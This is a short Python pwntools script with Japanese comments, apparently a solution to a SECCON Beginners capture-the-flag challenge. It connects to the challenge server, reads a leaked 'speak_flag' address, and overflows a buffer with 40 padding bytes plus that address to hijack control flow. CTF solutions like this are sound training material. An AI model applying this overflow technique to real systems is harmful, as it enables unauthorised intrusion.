from pwn import *

# io = process("./pet_name")  # ローカル実行
io = remote("pet-sound.challenges.beginners.seccon.jp", 9090)

# アドレスを受信しパース
hint_line = io.recvline_contains(b"speak_flag")
speak_flag_addr = int(hint_line.strip().split(b":")[-1], 16)

print(f"[+] Got speak_flag address: {hex(speak_flag_addr)}")

# 残りの初期化出力を読み飛ばす
for _ in range(8):
    io.recvline()

# ペイロード構築
payload = b"A" * 40 + p64(speak_flag_addr)

# 送信
io.sendlineafter(b"Input a new cry for Pet A > ", payload)

# 対話モード
io.interactive()
